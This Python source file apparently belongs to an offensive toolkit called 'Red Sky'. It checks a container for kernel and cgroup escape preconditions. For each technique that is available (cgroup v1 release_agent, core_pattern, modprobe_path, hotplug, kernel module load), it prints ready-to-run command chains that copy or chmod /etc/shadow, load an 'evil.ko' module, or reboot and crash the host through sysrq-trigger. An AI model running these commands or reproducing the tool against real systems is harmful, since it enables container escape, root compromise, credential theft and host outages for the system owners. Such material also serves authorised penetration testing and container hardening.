# language: Python, file: Program/container_escape/cgroup.py, target: Red Sky container_escape — cgroup + kernel escapes
# cgroup v1 release_agent (already in docker.py), cgroup v2 notification handle,
# /proc/sys/kernel/core_pattern, /proc/sysrq-trigger, modprobe_path overwrite,
# and usermode-helper injection. All require different capability preconditions.

import json
import os
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CE_DIR = OUTPUT_DIR / "container_escape"


def _exists(p): return Path(p).exists()
def _read(p, d=""):
    try: return Path(p).read_text(errors="replace").strip()
    except OSError: return d
def _write(p, v) -> bool:
    try: Path(p).write_text(v); return True
    except OSError: return False


def _cap_eff() -> int:
    status = _read("/proc/self/status")
    for line in status.splitlines():
        if line.startswith("CapEff:"):
            try: return int(line.split()[1], 16)
            except (ValueError, IndexError): return 0
    return 0


# ── 1. cgroup v1 release_agent — the classic ──
def check_cgroup_v1() -> Dict:
    cap = _cap_eff()
    has_sys_admin = bool(cap & (1 << 21))
    ra = None; notify = None
    try:
        for p in Path("/sys/fs/cgroup").iterdir():
            if (p / "release_agent").exists() and (p / "notify_on_release").exists():
                ra, notify = p / "release_agent", p / "notify_on_release"
                break
    except OSError:
        pass
    available = ra is not None and has_sys_admin
    return {
        "technique": "cgroup_v1_release_agent",
        "available": available,
        "release_agent": str(ra) if ra else "",
        "notify_on_release": str(notify) if notify else "",
        "commands": [
            f"echo 1 > {notify}",
            "cat > /tmp/pwn.sh <<'EOF'",
            "#!/bin/sh",
            "cat /etc/shadow > /tmp/shadow.out",
            "EOF",
            "chmod +x /tmp/pwn.sh",
            f"echo /tmp/pwn.sh > {ra}",
            "mkdir /tmp/cg_esc && echo $$ > /tmp/cg_esc/tasks && rmdir /tmp/cg_esc",
            "cat /tmp/shadow.out",
        ] if available else [],
        "note": "kernel invokes release_agent as root when cgroup empties",
    }


# ── 2. cgroup v2 — no release_agent, use notify_on_release equivalent ──
def check_cgroup_v2() -> Dict:
    # cgroup v2 has no release_agent, but you can write to cgroup.subtree_control
    # and use the "cgroup.freeze" / delegation to influence kernel threads.
    # More practically: cgroup v2 in a container running as root often gives
    # access to the /sys/fs/cgroup/cgroup.procs of the host via misconfigs.
    v2_root = Path("/sys/fs/cgroup")
    v2 = _exists(v2_root / "cgroup.controllers")
    writes = []
    for probe in (
        "/sys/fs/cgroup/cgroup.procs",
        "/sys/fs/cgroup/cgroup.subtree_control",
    ):
        if os.access(probe, os.W_OK):
            writes.append(probe)
    available = v2 and bool(writes)
    return {
        "technique": "cgroup_v2_control",
        "available": available,
        "writable": writes,
        "commands": [f"echo '+cpu +memory' > {p}" for p in writes],
        "note": "v2 has no release_agent. Writable cgroup.procs lets you move host procs, but no direct code exec.",
    }


# ── 3. core_pattern overwrite ──
def check_core_pattern() -> Dict:
    cp_path = "/proc/sys/kernel/core_pattern"
    cp = _read(cp_path)
    writable = os.access(cp_path, os.W_OK)
    cap = _cap_eff()
    has_admin = bool(cap & (1 << 21))
    available = writable and has_admin
    return {
        "technique": "core_pattern",
        "available": available,
        "current": cp,
        "commands": [
            "cat > /tmp/crash.sh <<'EOF'",
            "#!/bin/sh",
            "cat /etc/shadow > /tmp/shadow.out",
            "EOF",
            "chmod +x /tmp/crash.sh",
            f"echo '|/tmp/crash.sh' > {cp_path}",
            "ulimit -c unlimited",
            "kill -SEGV $$",
            "cat /tmp/shadow.out",
        ] if available else [],
        "note": "kernel runs the piped program as root on any segfault",
    }


# ── 4. modprobe_path overwrite ──
def check_modprobe() -> Dict:
    mp = "/proc/sys/kernel/modprobe"
    path = _read(mp)
    writable = os.access(mp, os.W_OK)
    cap = _cap_eff()
    has_admin = bool(cap & (1 << 21))
    available = writable and has_admin
    return {
        "technique": "modprobe_path",
        "available": available,
        "current": path,
        "commands": [
            "cat > /tmp/pwn.sh <<'EOF'",
            "#!/bin/sh",
            "chmod 777 /etc/shadow",
            "EOF",
            "chmod +x /tmp/pwn.sh",
            f"echo /tmp/pwn.sh > {mp}",
            "echo -ne '\\xff\\xff\\xff\\xff' > /tmp/badbin && chmod +x /tmp/badbin && /tmp/badbin",
            "cat /etc/shadow",
        ] if available else [],
        "note": "modprobe_path fires when the kernel sees an unknown binary format — runs as root",
    }


# ── 5. /proc/sysrq-trigger ──
def check_sysrq() -> Dict:
    p = "/proc/sysrq-trigger"
    writable = os.access(p, os.W_OK)
    return {
        "technique": "sysrq_trigger",
        "available": writable,
        "commands": [
            f"echo b > {p}",  # immediate reboot
            f"echo c > {p}",  # crash
        ] if writable else [],
        "note": "writable sysrq lets you reboot/crash the host — DoS primitive, not an escape",
    }


# ── 6. usermode-helper injection via /proc/sys/kernel/hotplug ──
def check_hotplug() -> Dict:
    p = "/proc/sys/kernel/hotplug"
    writable = os.access(p, os.W_OK)
    cap = _cap_eff()
    has_admin = bool(cap & (1 << 21))
    available = writable and has_admin
    return {
        "technique": "usermode_hotplug",
        "available": available,
        "commands": [
            "cat > /tmp/pwn.sh <<'EOF'",
            "#!/bin/sh",
            "cat /etc/shadow > /tmp/shadow.out",
            "EOF",
            "chmod +x /tmp/pwn.sh",
            f"echo /tmp/pwn.sh > {p}",
            "# trigger a hotplug event via uevent",
            "echo add > /sys/devices/virtual/net/lo/uevent 2>/dev/null || true",
        ] if available else [],
        "note": "old kernels — modern ones ignore hotplug and use /sbin/modprobe directly",
    }


# ── 7. Kernel module load ──
def check_insmod() -> Dict:
    cap = _cap_eff()
    has_module = bool(cap & (1 << 16))  # CAP_SYS_MODULE
    has_admin = bool(cap & (1 << 21))
    available = has_module and has_admin
    return {
        "technique": "kernel_module_load",
        "available": available,
        "commands": [
            "# compile a .ko against the running kernel headers",
            "insmod /tmp/evil.ko",
            "# then: from the loaded module, spawn a root process in init namespace",
        ] if available else [],
        "note": "CAP_SYS_MODULE = instant kernel code execution. Full escape, always.",
    }


TECHNIQUES = {
    "cgroup-v1":      check_cgroup_v1,
    "cgroup-v2":      check_cgroup_v2,
    "core-pattern":   check_core_pattern,
    "modprobe":       check_modprobe,
    "sysrq":          check_sysrq,
    "hotplug":        check_hotplug,
    "insmod":         check_insmod,
}


def cmd_list() -> int:
    print_info(f"{len(TECHNIQUES)} cgroup / kernel escape primitives")
    print()
    for name, fn in TECHNIQUES.items():
        r = fn()
        mark = f"{OK}▓{RESET}" if r["available"] else f"{ASH}░{RESET}"
        print(f"  {mark} {BONE}{name:<16}{RESET} {ASH}{r['technique']}{RESET}")
        print(f"      {CLOT}{r.get('note','')[:100]}{RESET}")
    return 0


def cmd_run(technique: str, out_file: str = "") -> int:
    if technique == "all":
        names = list(TECHNIQUES.keys())
    elif technique in TECHNIQUES:
        names = [technique]
    else:
        print_err(f"unknown technique: {technique}")
        print_info("available: " + ", ".join(TECHNIQUES.keys()) + ", all")
        return 2

    CE_DIR.mkdir(parents=True, exist_ok=True)
    results = []
    for name in names:
        print(f"\n{ARTERY}{BOLD}── {name}{RESET}")
        r = TECHNIQUES[name]()
        if r["available"]:
            print_ok("precondition met")
            for c in r.get("commands", []):
                print(f"  {SCARLET}$ {c}{RESET}")
            if r.get("note"):
                print(f"  {ASH}{r['note']}{RESET}")
        else:
            print_warn("not available")
        results.append(r)

    out = Path(out_file) if out_file else CE_DIR / f"kernel_escapes_{int(time.time())}.json"
    out.write_text(json.dumps(results, indent=2, default=str))
    print()
    print_kv("saved", out)
    return 0


def run_cli(args):
    if not args or args[0] == "list":
        return cmd_list()
    if args[0] == "run":
        if len(args) < 2:
            print_err("run needs a technique name (or 'all')")
            return 2
        out = ""
        if "--out" in args:
            i = args.index("--out")
            if i + 1 < len(args):
                out = args[i + 1]
        return cmd_run(args[1], out)
    print_err(f"unknown cgroup sub-command: {args[0]}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
